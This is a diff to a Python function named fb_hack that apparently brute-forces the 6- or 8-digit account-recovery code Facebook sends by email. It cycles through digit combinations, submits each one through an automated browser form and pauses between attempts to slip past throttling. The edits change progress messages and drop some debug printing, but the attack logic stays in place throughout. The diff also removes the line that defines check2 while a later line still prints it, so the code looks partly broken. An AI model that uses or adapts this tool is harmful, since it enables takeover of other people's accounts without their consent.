@@ -69,28 +69,22 @@ def fb_hack(email, codex):
       y = str(''.join(map(str, combination)))
       if attempt1 <= attempt2:
         attempt1 += 1
-        print("-", end='\r')
-        print("+", end='\r')
+        print("working -", end='\r')
+        print("working +", end='\r')
       else:
         print(y)
-        forms = list(browser.forms())
-        form = forms[0]
-        print(form)
         browser.select_form(nr=0)
         browser.set_value(str(y), nr=5)
         browser.submit()
         response1 = browser.response()
         soup = BeautifulSoup(response1, 'html.parser')
-        soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")   
+        soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
         if check1 != test:
           sleepy(30)
           attempt1 += 1
         else:
           break
   else:
-    response1 = browser.response()
-    soup = BeautifulSoup(response1, 'html.parser')
-    check2 = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")   
     attempt1 = 0
     attempt2 = int(codex)
     print(check2)
@@ -98,13 +92,10 @@ def fb_hack(email, codex):
       y = str(''.join(map(str, combination)))
       if attempt1 <= attempt2:
         attempt1 += 1
-        print("-", end='\r')
-        print("+", end='\r')
+        print("working -", end='\r')
+        print("working +", end='\r')
       else:
         print(y)
-        forms = list(browser.forms())
-        form = forms[0]
-        print(form)
         browser.select_form(nr=0)
         browser.set_value(str(y), nr=5)
         browser.submit()
